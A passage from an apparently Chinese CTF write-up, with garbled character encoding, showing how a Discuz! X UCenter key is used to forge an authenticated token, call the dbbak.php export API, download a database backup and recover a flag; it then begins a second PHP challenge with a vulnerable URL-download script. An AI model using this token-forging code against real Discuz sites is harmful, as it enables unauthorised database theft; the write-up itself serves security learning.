</span></span><span style="display:flex;"><span>		$query <span style="color:#f92672">=</span> $db<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">query</span>(<span style="color:#e6db74">&#34;SELECT datatables FROM </span><span style="color:#e6db74">{</span>$tablepre<span style="color:#e6db74">}</span><span style="color:#e6db74">common_plugin WHERE datatables&lt;&gt;&#39;&#39;&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">while</span>($plugin <span style="color:#f92672">=</span> $db<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">fetch_array</span>($query)) {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">foreach</span>(<span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#39;,&#39;</span>, $plugin[<span style="color:#e6db74">&#39;datatables&#39;</span>]) <span style="color:#66d9ef">as</span> $table) {
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span>($table <span style="color:#f92672">=</span> <span style="color:#a6e22e">trim</span>($table)) {
</span></span><span style="display:flex;"><span>					$tables[] <span style="color:#f92672">=</span> $table;
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">encode_arr</span>($get) {
</span></span><span style="display:flex;"><span>	$tmp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">foreach</span>($get <span style="color:#66d9ef">as</span> $key <span style="color:#f92672">=&gt;</span> $val) {
</span></span><span style="display:flex;"><span>		$tmp <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#39;&amp;&#39;</span><span style="color:#f92672">.</span>$key<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#f92672">.</span>$val;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_authcode</span>($tmp, <span style="color:#e6db74">&#39;ENCODE&#39;</span>, <span style="color:#a6e22e">UC_KEY</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">_authcode</span>($string, $operation <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;DECODE&#39;</span>, $key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>, $expiry <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>	$ckey_length <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	$key <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5</span>($key <span style="color:#f92672">?</span> $key <span style="color:#f92672">:</span> <span style="color:#a6e22e">UC_KEY</span>);
</span></span><span style="display:flex;"><span>	$keya <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">substr</span>($key, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">16</span>));
</span></span><span style="display:flex;"><span>	$keyb <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">substr</span>($key, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">16</span>));
</span></span><span style="display:flex;"><span>	$keyc <span style="color:#f92672">=</span> $ckey_length <span style="color:#f92672">?</span> ($operation <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;DECODE&#39;</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">substr</span>($string, <span style="color:#ae81ff">0</span>, $ckey_length)<span style="color:#f92672">:</span> <span style="color:#a6e22e">substr</span>(<span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">microtime</span>()), <span style="color:#f92672">-</span>$ckey_length)) <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	$cryptkey <span style="color:#f92672">=</span> $keya<span style="color:#f92672">.</span><span style="color:#a6e22e">md5</span>($keya<span style="color:#f92672">.</span>$keyc);
</span></span><span style="display:flex;"><span>	$key_length <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>($cryptkey);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	$string <span style="color:#f92672">=</span> $operation <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;DECODE&#39;</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">base64_decode</span>(<span style="color:#a6e22e">substr</span>($string, $ckey_length)) <span style="color:#f92672">:</span> <span style="color:#a6e22e">sprintf</span>(<span style="color:#e6db74">&#39;%010d&#39;</span>, $expiry <span style="color:#f92672">?</span> $expiry <span style="color:#f92672">+</span> <span style="color:#a6e22e">time</span>() <span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span><span style="color:#a6e22e">substr</span>(<span style="color:#a6e22e">md5</span>($string<span style="color:#f92672">.</span>$keyb), <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">16</span>)<span style="color:#f92672">.</span>$string;
</span></span><span style="display:flex;"><span>	$string_length <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>($string);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	$result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span>	$box <span style="color:#f92672">=</span> <span style="color:#a6e22e">range</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">255</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	$rndkey <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span>($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">255</span>; $i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>		$rndkey[$i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">ord</span>($cryptkey[$i <span style="color:#f92672">%</span> $key_length]);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span>($j <span style="color:#f92672">=</span> $i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">256</span>; $i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>		$j <span style="color:#f92672">=</span> ($j <span style="color:#f92672">+</span> $box[$i] <span style="color:#f92672">+</span> $rndkey[$i]) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>;
</span></span><span style="display:flex;"><span>		$tmp <span style="color:#f92672">=</span> $box[$i];
</span></span><span style="display:flex;"><span>		$box[$i] <span style="color:#f92672">=</span> $box[$j];
</span></span><span style="display:flex;"><span>		$box[$j] <span style="color:#f92672">=</span> $tmp;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span>($a <span style="color:#f92672">=</span> $j <span style="color:#f92672">=</span> $i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> $string_length; $i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>		$a <span style="color:#f92672">=</span> ($a <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>;
</span></span><span style="display:flex;"><span>		$j <span style="color:#f92672">=</span> ($j <span style="color:#f92672">+</span> $box[$a]) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>;
</span></span><span style="display:flex;"><span>		$tmp <span style="color:#f92672">=</span> $box[$a];
</span></span><span style="display:flex;"><span>		$box[$a] <span style="color:#f92672">=</span> $box[$j];
</span></span><span style="display:flex;"><span>		$box[$j] <span style="color:#f92672">=</span> $tmp;
</span></span><span style="display:flex;"><span>		$result <span style="color:#f92672">.=</span> <span style="color:#a6e22e">chr</span>(<span style="color:#a6e22e">ord</span>($string[$i]) <span style="color:#f92672">^</span> ($box[($box[$a] <span style="color:#f92672">+</span> $box[$j]) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>]));
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>($operation <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;DECODE&#39;</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(((<span style="color:#a6e22e">int</span>)<span style="color:#a6e22e">substr</span>($result, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">10</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> (<span style="color:#a6e22e">int</span>)<span style="color:#a6e22e">substr</span>($result, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">10</span>) <span style="color:#f92672">-</span> <span style="color:#a6e22e">time</span>() <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">substr</span>($result, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">16</span>) <span style="color:#f92672">===</span> <span style="color:#a6e22e">substr</span>(<span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">substr</span>($result, <span style="color:#ae81ff">26</span>)<span style="color:#f92672">.</span>$keyb), <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">16</span>)) {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">substr</span>($result, <span style="color:#ae81ff">26</span>);
</span></span><span style="display:flex;"><span>		} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> $keyc<span style="color:#f92672">.</span><span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;=&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#a6e22e">base64_encode</span>($result));
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$next_url <span style="color:#f92672">=</span> (<span style="color:#a6e22e">is_https</span>() <span style="color:#f92672">?</span> <span style="color:#e6db74">&#39;https&#39;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;http&#39;</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;://&#39;</span><span style="color:#f92672">.</span>$_SERVER[<span style="color:#e6db74">&#39;HTTP_HOST&#39;</span>]<span style="color:#f92672">.</span>$_SERVER[<span style="color:#e6db74">&#39;PHP_SELF&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;?apptype=&#39;</span><span style="color:#f92672">.</span>$GLOBALS[<span style="color:#e6db74">&#39;apptype&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&amp;code=&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">encode_arr</span>($get));
</span></span></code></pre></div><p>å¯ä»¥çœ‹åˆ°éœ€è¦ä¼ å…¥apptypeï¼Œè¿™é‡Œç”¨çš„æ˜¯discuzXï¼Œåº”è¯¥ä¼ å…¥å‚æ•°å€¼discuzxï¼Œè¿˜éœ€è¦ä¼ å…¥codeï¼Œå¯ä»¥å‘ç°$geté‡Œæ¯”è¾ƒé‡è¦çš„ä¸¤ä¸ªé”®å€¼å¯¹æ˜¯timeå’Œmethodï¼Œå¹¶ä¸”codeæœ‰1å°æ—¶çš„æœ‰æ•ˆæœŸï¼Œå…ˆå°è¯•ç”Ÿæˆä¸€ä¸ªï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">_authcode</span>($string, $operation <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;DECODE&#39;</span>, $key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>, $expiry <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>	$ckey_length <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	$key <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5</span>($key <span style="color:#f92672">?</span> $key <span style="color:#f92672">:</span> <span style="color:#a6e22e">UC_KEY</span>);
</span></span><span style="display:flex;"><span>	$keya <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">substr</span>($key, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">16</span>));
</span></span><span style="display:flex;"><span>	$keyb <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">substr</span>($key, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">16</span>));
</span></span><span style="display:flex;"><span>	$keyc <span style="color:#f92672">=</span> $ckey_length <span style="color:#f92672">?</span> ($operation <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;DECODE&#39;</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">substr</span>($string, <span style="color:#ae81ff">0</span>, $ckey_length)<span style="color:#f92672">:</span> <span style="color:#a6e22e">substr</span>(<span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">microtime</span>()), <span style="color:#f92672">-</span>$ckey_length)) <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	$cryptkey <span style="color:#f92672">=</span> $keya<span style="color:#f92672">.</span><span style="color:#a6e22e">md5</span>($keya<span style="color:#f92672">.</span>$keyc);
</span></span><span style="display:flex;"><span>	$key_length <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>($cryptkey);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	$string <span style="color:#f92672">=</span> $operation <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;DECODE&#39;</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">base64_decode</span>(<span style="color:#a6e22e">substr</span>($string, $ckey_length)) <span style="color:#f92672">:</span> <span style="color:#a6e22e">sprintf</span>(<span style="color:#e6db74">&#39;%010d&#39;</span>, $expiry <span style="color:#f92672">?</span> $expiry <span style="color:#f92672">+</span> <span style="color:#a6e22e">time</span>() <span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span><span style="color:#a6e22e">substr</span>(<span style="color:#a6e22e">md5</span>($string<span style="color:#f92672">.</span>$keyb), <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">16</span>)<span style="color:#f92672">.</span>$string;
</span></span><span style="display:flex;"><span>	$string_length <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>($string);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	$result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span>	$box <span style="color:#f92672">=</span> <span style="color:#a6e22e">range</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">255</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	$rndkey <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span>($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">255</span>; $i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>		$rndkey[$i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">ord</span>($cryptkey[$i <span style="color:#f92672">%</span> $key_length]);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span>($j <span style="color:#f92672">=</span> $i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">256</span>; $i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>		$j <span style="color:#f92672">=</span> ($j <span style="color:#f92672">+</span> $box[$i] <span style="color:#f92672">+</span> $rndkey[$i]) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>;
</span></span><span style="display:flex;"><span>		$tmp <span style="color:#f92672">=</span> $box[$i];
</span></span><span style="display:flex;"><span>		$box[$i] <span style="color:#f92672">=</span> $box[$j];
</span></span><span style="display:flex;"><span>		$box[$j] <span style="color:#f92672">=</span> $tmp;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span>($a <span style="color:#f92672">=</span> $j <span style="color:#f92672">=</span> $i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> $string_length; $i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>		$a <span style="color:#f92672">=</span> ($a <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>;
</span></span><span style="display:flex;"><span>		$j <span style="color:#f92672">=</span> ($j <span style="color:#f92672">+</span> $box[$a]) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>;
</span></span><span style="display:flex;"><span>		$tmp <span style="color:#f92672">=</span> $box[$a];
</span></span><span style="display:flex;"><span>		$box[$a] <span style="color:#f92672">=</span> $box[$j];
</span></span><span style="display:flex;"><span>		$box[$j] <span style="color:#f92672">=</span> $tmp;
</span></span><span style="display:flex;"><span>		$result <span style="color:#f92672">.=</span> <span style="color:#a6e22e">chr</span>(<span style="color:#a6e22e">ord</span>($string[$i]) <span style="color:#f92672">^</span> ($box[($box[$a] <span style="color:#f92672">+</span> $box[$j]) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>]));
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>($operation <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;DECODE&#39;</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(((<span style="color:#a6e22e">int</span>)<span style="color:#a6e22e">substr</span>($result, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">10</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> (<span style="color:#a6e22e">int</span>)<span style="color:#a6e22e">substr</span>($result, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">10</span>) <span style="color:#f92672">-</span> <span style="color:#a6e22e">time</span>() <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">substr</span>($result, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">16</span>) <span style="color:#f92672">===</span> <span style="color:#a6e22e">substr</span>(<span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">substr</span>($result, <span style="color:#ae81ff">26</span>)<span style="color:#f92672">.</span>$keyb), <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">16</span>)) {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">substr</span>($result, <span style="color:#ae81ff">26</span>);
</span></span><span style="display:flex;"><span>		} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> $keyc<span style="color:#f92672">.</span><span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;=&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#a6e22e">base64_encode</span>($result));
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$UC_KEY <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;N8ear1n0q4s646UeZeod130eLdlbqfs1BbRd447eq866gaUdmek7v2D9r9EeS6vb&#34;</span>;
</span></span><span style="display:flex;"><span>$tmp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;time=&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">time</span>()<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&amp;method=export&#34;</span>;
</span></span><span style="display:flex;"><span>$code <span style="color:#f92672">=</span> <span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">_authcode</span>($tmp, <span style="color:#e6db74">&#39;ENCODE&#39;</span>, $UC_KEY));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">print</span>($code);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>payloadï¼š</p>
<pre tabindex="0"><code>http://challenge.xinshi.fun:43672/api/db/dbbak.php?apptype=discuzx&amp;code=7e6boiAfroxp9Fuy7oIpRV3cXkVfPwg9zOKPJNuyuUTlr3UsJzuwez0yqdCPZmRqTPp6RVSTsKUL3w
</code></pre><p>ç½‘é¡µå›æ˜¾ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;root&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;error</span> <span style="color:#a6e22e">errorCode=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">errorMessage=</span><span style="color:#e6db74">&#34;ok&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;fileinfo&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;file_num&gt;</span>1<span style="color:#f92672">&lt;/file_num&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;file_size&gt;</span>1999894<span style="color:#f92672">&lt;/file_size&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;file_name&gt;</span>250828_mp6bJ6-1.sql<span style="color:#f92672">&lt;/file_name&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;file_url&gt;</span>
</span></span><span style="display:flex;"><span>http://challenge.xinshi.fun:43672/data/backup_250828_B0yInW/250828_mp6bJ6-1.sql
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/file_url&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;last_modify&gt;</span>1756381296<span style="color:#f92672">&lt;/last_modify&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/fileinfo&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;nexturl&gt;</span>
</span></span><span style="display:flex;"><span>http://challenge.xinshi.fun:43672/api/db/dbbak.php?apptype=discuzx<span style="color:#960050;background-color:#1e0010">&amp;</span>code=9190Bmhg8Qj40j7JucTh7pcdbHXbfpQBB8nCbL1K53hukNft8CQNrD1iPSqVq0kYH7kd5%2F2NRBDsBy0HcWelImYQEYXjaERQK9PL0zoOJvvdx0ag3B5K55Y3D%2F8SrsYBxncKlQWZ0s1spkg90he06%2BnV2fgL9XKNUY2ysELgL3a29NApEUofoiX5pjktVkHQqMDbsHWLKIyj
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/nexturl&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/root&gt;</span>
</span></span></code></pre></div><p>sqlä»£ç é‡Œæ‰¾åˆ°ä¸¤å¥INSERTè¯­å¥ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> pre_a_flag <span style="color:#66d9ef">VALUES</span> (<span style="color:#e6db74">&#39;1&#39;</span>,<span style="color:#ae81ff">0</span>x666c61677b746573745f666c61677d);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> pre_a_flag <span style="color:#66d9ef">VALUES</span> (<span style="color:#e6db74">&#39;2&#39;</span>,<span style="color:#ae81ff">0</span>x4c494c4354467b686176455f7923755f3123754e445f345f4a4f365f4e23773f5f6841484068417d);
</span></span></code></pre></div><p>è§£hexå¾—åˆ°flagï¼šLILCTF{havE_y#u_1#uND_4_JO6_N#w?_hAH@hA}</p>
<p>å‚è€ƒèµ„æ–™ï¼š</p>
<p><a href="https://mp.weixin.qq.com/s/IDkUpjPL0mzSxKOgldHPeQ">https://mp.weixin.qq.com/s/IDkUpjPL0mzSxKOgldHPeQ</a></p>
<p><a href="https://guokeya.github.io/post/87yhVz7uW/">https://guokeya.github.io/post/87yhVz7uW/</a></p>
<h2 id="php_jail_is_my_cry">php_jail_is_my_cry<a hidden class="anchor" aria-hidden="true" href="#php_jail_is_my_cry">#</a></h2>
<blockquote>
</blockquote>
<pre><code>è¯·æ³¨æ„é™„ä»¶ä¸­çš„ä»£ç å­˜åœ¨ä¸€è¡Œéœ€è¦ä½ è¡¥å……çš„ä»£ç , å·²ç»æ³¨é‡Šè¡¨æ˜, å¦åˆ™ä¼šå­˜åœ¨é—®é¢˜
æœ€ç»ˆéœ€è¦æ‰§è¡Œ /readflag
å¹¶æ²¡æœ‰å¼€å¯ allow_url_include
</code></pre>
<p>index.phpï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;url&#39;</span>])) {
</span></span><span style="display:flex;"><span>    $url <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;url&#39;</span>];
</span></span><span style="display:flex;"><span>    $file_name <span style="color:#f92672">=</span> <span style="color:#a6e22e">basename</span>($url);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    $ch <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_init</span>($url);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_setopt</span>($ch, <span style="color:#a6e22e">CURLOPT_RETURNTRANSFER</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>    $data <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_exec</span>($ch);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_close</span>($ch);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($data) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">file_put_contents</span>(<span style="color:#e6db74">&#39;/tmp/&#39;</span><span style="color:#f92672">.</span>$file_name, $data);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;æ–‡ä»¶å·²ä¸‹è½½: &lt;a href=&#39;?down=</span><span style="color:#e6db74">$file_name</span><span style="color:#e6db74">&#39;&gt;</span><span style="color:#e6db74">$file_name</span><span style="color:#e6db74">&lt;/a&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;ä¸‹è½½å¤±è´¥ã€‚&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;down&#39;</span>])){
